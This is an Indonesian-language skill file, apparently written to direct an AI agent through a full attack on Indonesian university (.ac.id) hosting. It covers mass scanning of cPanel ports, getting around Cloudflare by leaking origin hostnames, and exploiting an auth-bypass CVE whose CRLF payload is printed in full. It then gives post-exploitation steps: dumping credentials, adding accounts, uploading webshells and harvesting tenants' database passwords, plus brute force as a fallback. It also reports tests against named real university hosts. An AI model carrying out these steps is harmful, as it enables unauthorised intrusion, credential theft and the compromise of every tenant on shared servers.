---
name: ac-id-cpanel
description: "Rantai penuh .ac.id → cPanel/WHM → root: discovery massal domain kampus, fingerprint cpsrvd di 6 port cPanel, resolve origin asli untuk bypass Cloudflare, deteksi & exploit CVE-2026-41940 (auth bypass CVSS 10 → WHM root → RCE), post-exploit (dump/passwd/cmd/shell/adduser), plus jalur cadangan (bruteforce panel, exposure scan). Load saat tugasnya 'hack cpanel ac.id', 'cari whm kampus', 'bypass cpanel', atau 'root dari hosting kampus'. Tool terverifikasi: $HOME/hacktools/cpanel/{cfinder.py,cpchain.sh,cpbypass/exploit.py}."
---

# SKILL: ac-id-cpanel — .ac.id → cPanel/WHM → Root

**Prinsip:** port terbuka bukan bukti, panel login bukan bukti. Bukti = `/json-api/version`
mengembalikan 200 dengan payload `hasroot=1` (WHM root) atau session cpanel valid.
Cloudflare di depan domain hampir selalu 403 di tahap session — origin hostname dari cpsrvd
adalah jalur bypass-nya.

## Tool terpasang (SUDAH DIVERIFIKASI jalan di mesin ini)

| Tool | Path | Fungsi |
|---|---|---|
| `cfinder.py` | `$HOME/hacktools/cpanel/cfinder.py` | probe 2082/2083/2086/2087/2095/2096, fingerprint cpsrvd, filter soft-404, `--origin` resolve hostname asli |
| `cpchain.sh` | `$HOME/hacktools/cpanel/cpchain.sh` | pipeline: discovery → nuclei CVE-2026-41940 → CP-Bypass exploit |
| `CP-Bypass` | `$HOME/hacktools/cpanel/cpbypass/exploit.py` | exploit CVE-2026-41940 + post-exploit (`dump/passwd/cmd/exec/shell/info/adduser`) |
| `cve-2026-41940-tool` | `$HOME/hacktools/cpanel/null200ok/cve_2026_41940_tool.py` | versi interaktif + google dork + report JSON/HTML |
| `cPanelSniper` | `$HOME/hacktools/cpanel/cpsniper/cPanelSniper.py` | scanner massal streaming, `--resume`, hemat memori (target 10M) |
| `cpanel_cracker` | `$HOME/hacktools/cpanel/cracker/odcs_cpanel.py` | bruteforce login cPanel (port 2082/2083) |
| template nuclei | `~/nuclei-templates/http/cves/2026/CVE-2026-41940.yaml` | deteksi resmi (watchtowr + hadrian + DhiyaneshDk) |

## CVE inti

**CVE-2026-41940** — cPanel & WHM auth bypass via CRLF injection di session file (`Session.pm`
memanggil `filter_sessiondata()` setelah menulis file). Payload `Authorization: Basic` decode ke:

```
root:x
successful_internal_auth_with_timestamp=9999999999
user=root
tfa_verified=1
hasroot=1
```

Ter-patch di: 203.0.113.10, 203.0.113.10, 203.0.113.10, 203.0.113.10, 203.0.113.10, 203.0.113.10.
Rantai: mint session (`POST /login/?login_only=1`) → poison (`GET /` + Basic CRLF) → cache flush
(`/scripts2/listaccts`) → validasi (`/json-api/version`).

## Alur kerja

```bash
cd $HOME/hacktools/cpanel

# 1. Discovery + fingerprint + origin resolve
python3 cfinder.py -f $HOME/hacktools/acid_domains.txt --limit 300 \
  --ports 2082,2083,2086,2087,2095,2096 --workers 24 --timeout 6 --origin -o out_ac

# 2. Deteksi massal (nuclei sudah include template)
nuclei -l out_ac/origin_hosts.txt -t ~/nuclei-templates/http/cves/2026/CVE-2026-41940.yaml -no-color

# 3. Exploit target rentan → dapat WHM root
python3 cpbypass/exploit.py -u https://ORIGIN:2087 --timeout 20
python3 cpbypass/exploit.py -u https://ORIGIN:2087 --action cmd --cmd "id;uname -a"
python3 cpbypass/exploit.py -u https://ORIGIN:2087 --action dump          # dump kredensial panel
python3 cpbypass/exploit.py -u https://ORIGIN:2087 --action adduser --new-user shell1 --new-domain x.ac.id
python3 cpbypass/exploit.py -u https://ORIGIN:2087 --action shell         # shell interaktif WHM

# atau satu perintah untuk semua tahap
./cpchain.sh -f acid_domains.txt --limit 300 -o out --workers 24 --exploit
```

Urutan manual yang benar bila `cfinder` tidak dipakai:
`nmap -p2082,2083,2086,2087,2095,2096` → ambil yang `cpsrvd`/title `WHM Login` → resolve origin
→ nuclei → exploit.

## Bypass Cloudflare (WAJIB, ini yang bikin exploit jalan)

Domain `.ac.id` umumnya di belakang Cloudflare; port 2083/2087/2096 **termasuk port proxy CF**,
jadi request langsung ke `www.target.ac.id:2087` kena 403 WAF di tahap mint session.
cpsrvd sendiri membocorkan hostname asli:

```bash
curl -sk -D- -o /dev/null "https://www.target.ac.id:2087/openid_connect/cpanelid" | grep -i location
# → Location: https://xxx.iixcp.rumahweb.net:2087/...
```

Hostname itu langsung bisa dihubungi tanpa CF (200/401), dan di situlah exploit berjalan.
`cfinder.py --origin` melakukan ini otomatis dan menuliskan baris `...|origin` ke `cp_hosts.txt`.

## Hasil uji lapangan (nyata, apa adanya)

Sampel 60 host dari `acid_domains.txt` (port 2083/2087/2096, 24 worker):

| Host | Port | Fingerprint | Origin | Exploit |
|---|---|---|---|---|
| www.staialazharpekanbaru.ac.id | 2083/2087/2096 | cPanel + WHM + Webmail (Cloudflare) | jembayan.iixcp.rumahweb.net | 403 di CF, langsung ke origin → stage 1–3 OK, **validasi ditolak (ter-patch)** |
| mail.amikjombang.ac.id | 2082 | resolve ke 127.0.0.1 (A record salah) | - | di-skip oleh filter `ip_private_or_loopback` |

Angka: 60 host → 7 alive di port cPanel → 3 panel cPanel/WHM nyata → 1 target diuji exploit →
ter-patch (`{"cpanelresult":{"error":"Access denied"}}`), nuclei juga tidak match. Konsisten.

Artinya: **jangan klaim vulnerable tanpa `/json-api/version` 200.** Hit rate panel ~5% dari
domain acak; yang rentan jauh lebih kecil karena cPanel auto-update.

## Post-exploitation setelah WHM root

1. `--action dump` → daftar akun cPanel, domain, user, quota.
2. `--action adduser --new-user X --new-domain Y` → akun cPanel baru milik kita (paket default).
3. Upload webshell ke `public_html` akun itu lewat API cPanel (`--action cmd` untuk `curl`/`cp`
   langsung di OS, atau login cPanel pakai akun baru → File Manager → upload `.php`).
4. `--action passwd --passwd ...` hanya bila memang perlu (mengubah root pass = jejak besar).
5. Lanjut lateral: baca `/home/*/public_html/*/wp-config.php` (kredensial DB per tenant),
   `/etc/userdomains`, `/var/cpanel/users/*`, lalu `post_rce.md` untuk pivot internal.

## Jalur cadangan bila CVE-2026-41940 ter-patch

| Jalur | Tool | Catatan |
|---|---|---|
| bruteforce panel cPanel | `cracker/odcs_cpanel.py` (interaktif) | pakai combo dari exposure scan; risiko lockout |
| exposure sweep (.env/.git/log/backup) | `acidhunt.py` (skill `ac-id-recon`) | sering beri kredensial DB/APP_KEY sebelum sentuh panel |
| .env → APP_KEY → deserialization RCE | skill `laravel-env-chain` | jalur RCE paling sering berhasil di hosting kampus |
| upload webshell setelah login | skill `upload-bypass` | File Manager cPanel menerima `.php` mentah |
| CMS exploit (WP/Joomla/OJS/SLiMS) | skill `cms_exploit`, `red-team/wordpress-exploitation` | panel cPanel hanya pintu; CMS yang paling banyak lubang |
| CVE cPanel lain | `skills__cve-research` + `nuclei -tags cpanel` | cek CVE-2023-29489 (XSS cpsrvd), WHMCS |

## Aturan bukti

- `200 OK` pada `/login/` = panel ada, **bukan** rentan.
- Rentan = nuclei match ATAU CP-Bypass `Auth bypass did not land` tidak muncul + `/json-api/version` 200.
- Kalau `nuclei` diam dan CP-Bypass bilang `Access denied` → tulis **ter-patch**, jangan mengarang.
- Simpan log mentah: `out_ac/cp_hosts.jsonl`, `exploit.log`, output nuclei.

## Keterbatasan

- CF bisa mem-proxy 2083/2087/2096; origin hostname dari cpsrvd bisa juga di belakang CF lain.
- Shared hosting (rumahweb/iixcp dsb.) satu origin untuk banyak domain → satu kali root = semua tenant.
- Scan 6 port × ribuan domain dari satu IP memicu rate-limit; `--workers` 12–24, `--timeout` 5–8.
